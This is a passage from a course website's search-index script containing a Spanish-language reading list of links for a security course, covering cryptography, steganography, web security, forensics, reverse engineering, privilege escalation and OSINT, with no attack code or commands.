href=\"https://en.wikipedia.org/wiki/UTF-8\"\u003eUTF-8 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Morse_code\"\u003eCódigo Morse (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eLenguajes Esotéricos\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Esoteric_programming_language\"\u003eEsolangs (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://esolangs.org/wiki/Main_Page\"\u003eWiki de Lenguajes Esotéricos\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eOfuscación de Código\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Obfuscation_(software)\"\u003eOfuscación (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eCriptografía Clásica\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/History_of_cryptography\"\u003eHistoria de la Criptografía (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Classical_cipher\"\u003eCriptografía Clásica (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Letter_frequency\"\u003eFrecuencia de Caracteres (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eHerramientas de Esteganografía Generales\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr\"\u003eDCode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://cryptii.com/\"\u003eCryptii\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ReFirmLabs/binwalk\"\u003eBinwalk\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eEsteganografía en Audio\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/WAV\"\u003eWAV (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/MP3\"\u003eMP3 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/ID3\"\u003eID3 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eEsteganografía en Texto\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Acrostic\"\u003eAcrósticos (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eEsteganografía en Imágenes\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Portable_Network_Graphics\"\u003ePNG (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.w3.org/TR/PNG/\"\u003eEspecificación Oficial PNG\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/JPEG\"\u003eJPEG (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jpeg.org/jpeg/\"\u003eEspecificación Oficial JPEG\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Scalable_Vector_Graphics\"\u003eSVG (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.w3.org/TR/SVG2/\"\u003eEspecificación Oficial SVG\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"criptografía-moderna\"\u003eCriptografía Moderna\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLibro \u003ca href=\"https://www.amazon.com/Serious-Cryptography-Practical-Introduction-Encryption-ebook/dp/B0722MTGQV\"\u003e\u0026ldquo;Serious Cryptography: A Practical Introduction to Modern Encryption\u0026rdquo; de Jean-Philippe Aumasson\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/MD5\"\u003eMD5 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Secure_Hash_Algorithms\"\u003eSecure Hash Algorithms (SHA) (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Key_derivation_function\"\u003eKey Derivation Function (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Block_cipher\"\u003eCifradores de Bloque (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation\"\u003eModos de Cifradores de Bloque (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Stream_cipher\"\u003eCifradores de flujo (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/RC4\"\u003eRC4 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/DES\"\u003eDigital Encryption Standard (DES) (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Salsa20\"\u003eSalsa20 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Advanced_Encryption_Standard\"\u003eAdvanced Encryption Standard (AES) (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/HMAC\"\u003eHMAC (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/RSA_(cryptosystem)\"\u003eRSA (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange\"\u003eDiffie-Hellman (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"aplicaciones-web\"\u003eAplicaciones Web\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/rapid7/metasploit-framework\"\u003eOWASP\u003c/a\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-top-ten/\"\u003eTop 10\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-web-security-testing-guide/\"\u003eWeb Security Testing Guide\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-dependency-track/\"\u003eDependency Track\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-juice-shop/\"\u003eJuice Shop\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-mobile-security-testing-guide/\"\u003eMobile Security Testing Guide\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-modsecurity-core-rule-set/\"\u003eModSecurity Core Rule Set\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-samm/\"\u003eSoftware Assurance Maturity Model (SAMM)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-security-knowledge-framework/\"\u003eSecurity Knowledge Framework\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-zap/\"\u003eZed Attack Proxy (ZAP)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-community/xss-filter-evasion-cheatsheet\"\u003eGuía de Evasión de Filtros XSS\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/digininja/DVWA\"\u003eDamn Vulnerable Web Application (DVWA)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.w3schools.com/js/DEFAULT.asp\"\u003eTutorial de JavaScript\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.w3schools.com/sql/default.asp\"\u003eTutorial de SQL\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.first.org/cvss/v3.1/specification-document\"\u003eEspecificaciones CVSS\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.exploit-db.com/\"\u003eExploit DB\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://vuldb.com/\"\u003eVulDB\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.cvedetails.com/\"\u003eCVE Details\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"análisis-forense\"\u003eAnálisis Forense\u003c/h2\u003e\n\u003ch3 id=\"comandos-útiles\"\u003eComandos Útiles\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://www.hcs.harvard.edu/~dholland/computers/awk.html\"\u003eTutorial de AWK\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"versionamiento\"\u003eVersionamiento\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Git\"\u003eGit (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Mercurial\"\u003eMercurial (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Apache_Subversion\"\u003eSubversion (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"almacenamiento-en-linux\"\u003eAlmacenamiento en Linux\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Device_file\"\u003eDevice Files (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Loop_device\"\u003eLoop Devices (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Disk_partitioning\"\u003eParticionado (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Master_boot_record\"\u003eMBR (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/GUID_Partition_Table\"\u003eGPT (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/File_Allocation_Table\"\u003eFAT (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Ext4\"\u003eext4 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/NTFS\"\u003eNTFS (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/ZFS\"\u003eZFS (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Btrfs\"\u003eBtrfs (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/HFS_Plus\"\u003eHFS+ (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Apple_File_System\"\u003eAPFS (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recuperación-de-archivos\"\u003eRecuperación de archivos\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.cgsecurity.org/wiki/TestDisk\"\u003e\u003cstrong\u003eTestdisk\u003c/strong\u003e (Linux, software libre)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.gnu.org/software/ddrescue/\"\u003e\u003cstrong\u003eddrescue\u003c/strong\u003e (GNU/Linux, software libre)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Fsck\"\u003e\u003cstrong\u003eFSCK\u003c/strong\u003e (Linux, software libre)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/CHKDSK\"\u003e\u003cstrong\u003eCHKDSK\u003c/strong\u003e (Windows)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.ccleaner.com/recuva\"\u003e\u003cstrong\u003eRecuva\u003c/strong\u003e (Windows, software privativo)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"modelo-de-internet\"\u003eModelo de Internet\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Internet_protocol_suite\"\u003eModelo de Internet (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Link_layer\"\u003eCapa de Enlace (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Internet_layer\"\u003eCapa de Red (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Transport_layer\"\u003eCapa de Transporte (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Application_layer\"\u003eCapa de Aplicación (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"wireshark\"\u003eWireshark\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.wireshark.org/\"\u003ePágina Principal de Wireshark\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.wireshark.org/docs/wsug_html/\"\u003eManual de Wireshark\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ingeniería-reversa\"\u003eIngeniería Reversa\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.tutorialspoint.com/assembly_programming/index.htm\"\u003eAssembler\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://book.rada.re/index.html\"\u003eDocumentación radare2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.megabeets.net/a-journey-into-radare-2-part-1/\"\u003eTutorial radare2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"pwning\"\u003ePwning\u003c/h2\u003e\n\u003ch3 id=\"escalamiento-de-privilegios\"\u003eEscalamiento de Privilegios\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Setuid\"\u003e\u003ccode\u003esetuid\u003c/code\u003e y \u003ccode\u003esetgid\u003c/code\u003e (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Sudo\"\u003e\u003ccode\u003esudo\u003c/code\u003e (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://toroid.org/sudoers-syntax\"\u003eReferencia a \u003ccode\u003e/etc/sudoers\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://d00mfist1.gitbooks.io/ctf/content/privilege_escalation_-_linux.html\"\u003eConsejos para Escalamiento de Privilegios de d00mfist1\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://iamnasef.com/walkthrough/linesc/\"\u003eGuía de escalamiento de privilegios de Iamnasef\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/Ignitetechnologies/Privilege-Escalation\"\u003eRepositorio con muchos scripts de escalamiento de privilegios\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://gtfobins.github.io/\"\u003eGTFOBins\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"buffer-overflow\"\u003eBuffer Overflow\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://unixwiz.net/techtips/x86-jumps.html\"\u003eJumps x86\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Shellcode\"\u003eShellcodes\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://shell-storm.org/shellcode/\"\u003eMás Shellcodes\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.eecs.umich.edu/courses/eecs588/static/stack_smashing.pdf\"\u003eSmashing the Stack for Fun and Profit\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://padraignix.github.io/reverse-engineering/2019/09/28/buffer-overflow-practical-case-study/\"\u003eCaso de Estudio práctico de Buffer Overflow\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"osint\"\u003eOSINT\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Google_hacking\"\u003eGoogle Hacking\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://gbhackers.com/latest-google-dorks-list/\"\u003eGoogle Dorks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/search/advanced\"\u003eGithub Search\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"hacking-y-seguridad-en-general\"\u003eHacking y Seguridad en General\u003c/h2\u003e\n\u003ch3 id=\"escritas\"\u003eEscritas\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://thehackernews.com/\"\u003eThe Hacker News\u003c/a\u003e: Noticias relacionadas a seguridad.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://www.phrack.org/\"\u003ePhrack\u003c/a\u003e: Revista de hackers y especialistas en seguridad.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"youtube\"\u003eYouTube\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA\"\u003eIppSec\u003c/a\u003e: Resolución de máquinas retiradas en HTB.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w\"\u003eLiveOverflow\u003c/a\u003e: CTFs y hacking de todo tipo.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/channel/UC3S8vxwRfqLBdIhgRlDRVzw\"\u003eStacksmashing\u003c/a\u003e: Reversing y hardware hacking.\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A\"\u003ePwnFunction\u003c/a\u003e: Explica distintos tipos de ataques de manera simplificada.\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:59,href:"/docs/hardware/",title:"Hardware",description:"Analizar firmware y protocolos de comunicación de bajo nivel.",content:""},{id:60,href:"/docs/prologo/",title:"Prólogo",description:"Introducción y definiciones de conceptos",content:""},{id:61,href:"/docs/",title:"Apunte",description:"Apunte del curso CC5325",content:""},];index.add(docs);userinput.addEventListener('input',show_results,true);suggestions.addEventListener('click',accept_suggestion,true);function show_results(){var value=this.value;var results=index.search(value,5);var entry,childs=suggestions.childNodes;var i=0,len=results.length;suggestions.classList.remove('d-none');results.forEach(function(page){entry=document.createElement('div');entry.innerHTML='<a href><span></span><span></span></a>';a=entry.querySelector('a'),t=entry.querySelector('span:first-child'),d=entry.querySelector('span:nth-child(2)');a.href=page.href;t.textContent=page.title;d.textContent=page.description;suggestions.appendChild(entry);});while(childs.length>len){suggestions.removeChild(childs[i])}}
function accept_suggestion(){while(suggestions.lastChild){suggestions.removeChild(suggestions.lastChild);}
return false;}}());